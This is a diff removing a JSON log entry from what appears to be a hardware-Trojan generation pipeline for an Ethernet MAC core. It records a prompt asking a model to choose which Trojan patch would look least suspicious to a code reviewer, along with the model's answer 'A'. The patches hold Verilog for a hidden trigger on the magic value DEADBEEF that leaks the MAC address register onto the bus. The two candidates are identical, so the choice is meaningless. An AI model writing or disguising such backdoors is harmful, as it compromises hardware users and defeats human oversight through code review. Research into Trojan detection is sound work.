@@ -1,7 +1,0 @@
-{
-  "timestamp": "20260418_122012_248693",
-  "trojan_id": "trojan_1",
-  "stage": "patch_select",
-  "prompt": "Two hardware Trojan patches for the same ethmac trigger/payload.\nPick the one whose signal names and expressions look MORE like normal Wishbone bus logic\n(less suspicious to a code reviewer). Answer ONLY \"A\" or \"B\".\n\nCandidate A:\n  trigger: if (wb_dat_i == 32'hDEADBEEF && wb_we_i && wb_stb_i) trojan_armed <= 1'b1;\n  assign:  assign wb_dat_o[31:0] = trojan_armed ? r_MacAddr0 : temp_wb_dat_o_reg;\n\nCandidate B:\n  trigger: if (wb_dat_i == 32'hDEADBEEF && wb_we_i && wb_stb_i) trojan_armed <= 1'b1;\n  assign:  assign wb_dat_o[31:0] = trojan_armed ? r_MacAddr0 : temp_wb_dat_o_reg;\n",
-  "response": "A"
-}
